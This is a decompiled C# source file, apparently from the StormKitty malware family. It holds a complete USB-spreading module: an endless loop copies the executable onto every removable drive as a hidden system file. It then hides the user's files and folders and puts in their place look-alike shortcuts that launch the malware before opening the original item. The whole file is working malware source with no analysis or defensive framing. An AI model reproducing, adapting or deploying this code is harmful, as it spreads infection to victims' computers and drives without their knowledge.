using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace StormKitty
{
	// Token: 0x02000052 RID: 82
	internal class USBInstaller
	{
		// Token: 0x06000163 RID: 355 RVA: 0x0000C3B4 File Offset: 0x0000A5B4
		public static void GetUSB()
		{
			if (USBInstaller.mutex.WaitOne(TimeSpan.Zero, true))
			{
				USBInstaller.Driver(true);
				return;
			}
			USBInstaller.Driver(false);
		}

		// Token: 0x06000164 RID: 356 RVA: 0x0000C3D8 File Offset: 0x0000A5D8
		public static void Driver(bool startThread)
		{
			if (startThread)
			{
				USBInstaller.spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
				USBInstaller.ExecParam(USBInstaller.spath);
				new Thread(new ThreadStart(USBInstaller.USB_boot), 1).Start();
				return;
			}
			USBInstaller.spath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
			USBInstaller.ExecParam(USBInstaller.spath);
		}

		// Token: 0x06000165 RID: 357 RVA: 0x0000C464 File Offset: 0x0000A664
		public static void USB_boot()
		{
			for (;;)
			{
				try
				{
					string[] array = Strings.Split(USBInstaller.DetectUSBDrivers(), "<->", -1, CompareMethod.Binary);
					int num = Information.UBound(array, 1) - 1;
					for (int i = 0; i <= num; i++)
					{
						if (!File.Exists(array[i] + "\\" + Process.GetCurrentProcess().MainModule.ModuleName))
						{
							File.Copy(Assembly.GetExecutingAssembly().Location, array[i] + Process.GetCurrentProcess().MainModule.ModuleName);
							File.SetAttributes(array[i] + "\\" + Process.GetCurrentProcess().MainModule.ModuleName, FileAttributes.Hidden | FileAttributes.System);
						}
						foreach (string path in Directory.GetFiles(array[i]))
						{
							if (Operators.CompareString(Path.GetExtension(path), ".lnk", false) != 0 && Operators.CompareString(Path.GetFileName(path), Process.GetCurrentProcess().MainModule.ModuleName, false) != 0)
							{
								Thread.Sleep(200);
								File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
								USBInstaller.CreateShortCut(Path.GetFileName(path), array[i], Path.GetFileNameWithoutExtension(path), USBInstaller.GetIconoffile(Path.GetExtension(path)));
							}
						}
						foreach (string path2 in Directory.GetDirectories(array[i]))
						{
							Thread.Sleep(100);
							File.SetAttributes(path2, FileAttributes.Hidden | FileAttributes.System);
							USBInstaller.CreateShortCut(Path.GetFileNameWithoutExtension(path2), array[i] + "\\", Path.GetFileNameWithoutExtension(path2), null);
						}
					}
				}
				catch
				{
				}
				Thread.Sleep(5000);
			}
		}

		// Token: 0x06000166 RID: 358 RVA: 0x0000C618 File Offset: 0x0000A818
		private static void CreateShortCut(string TargetName, string ShortCutPath, string ShortCutName, string Icon)
		{
			try
			{
				USBInstaller.ObjectShell = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
				USBInstaller.ObjectLink = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(USBInstaller.ObjectShell, null, "CreateShortcut", new object[]
				{
					ShortCutPath + "\\" + ShortCutName + ".lnk"
				}, null, null, null));
				NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "TargetPath", new object[]
				{
					ShortCutPath + "\\" + Process.GetCurrentProcess().MainModule.ModuleName
				}, null, null);
				NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "WindowStyle", new object[]
				{
					1
				}, null, null);
				if (Icon == null)
				{
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "Arguments", new object[]
					{
						" " + ShortCutPath + "\\" + TargetName
					}, null, null);
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "IconLocation", new object[]
					{
						"%SystemRoot%\\system32\\SHELL32.dll,3"
					}, null, null);
				}
				else
				{
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "Arguments", new object[]
					{
						" " + ShortCutPath + "\\" + TargetName
					}, null, null);
					NewLateBinding.LateSet(USBInstaller.ObjectLink, null, "IconLocation", new object[]
					{
						Icon
					}, null, null);
				}
				NewLateBinding.LateCall(USBInstaller.ObjectLink, null, "Save", new object[0], null, null, null, true);
			}
			catch
			{
			}
		}

		// Token: 0x06000167 RID: 359 RVA: 0x0000C7A0 File Offset: 0x0000A9A0
		private static string GetIconoffile(string FileFormat)
		{
			string result;
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
				string text = Conversions.ToString(registryKey.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey.OpenSubKey(FileFormat, false).GetValue(""), "\\DefaultIcon\\"))).GetValue("", ""));
				if (!text.Contains(","))
				{
					text += ",0";
				}
				result = text;
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000168 RID: 360 RVA: 0x0000C830 File Offset: 0x0000AA30
		private static string DetectUSBDrivers()
		{
			string text = "";
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (driveInfo.DriveType == DriveType.Removable)
				{
					text = text + driveInfo.RootDirectory.FullName + "<->";
				}
			}
			return text;
		}

		// Token: 0x06000169 RID: 361 RVA: 0x0000C87C File Offset: 0x0000AA7C
		private static void ExecParam(string Parameter)
		{
			if (Operators.CompareString(Parameter, null, false) != 0)
			{
				if (Strings.InStrRev(Parameter, ".", -1, CompareMethod.Binary) > 0)
				{
					Process.Start(Parameter);
					return;
				}
				Interaction.Shell("explorer " + Parameter, AppWinStyle.NormalFocus, false, -1);
			}
		}

		// Token: 0x04000095 RID: 149
		private static object ObjectShell;

		// Token: 0x04000096 RID: 150
		private static object ObjectLink;

		// Token: 0x04000097 RID: 151
		private static string spath;

		// Token: 0x04000098 RID: 152
		public static readonly Mutex mutex = new Mutex(true, "idDriver");
	}
}
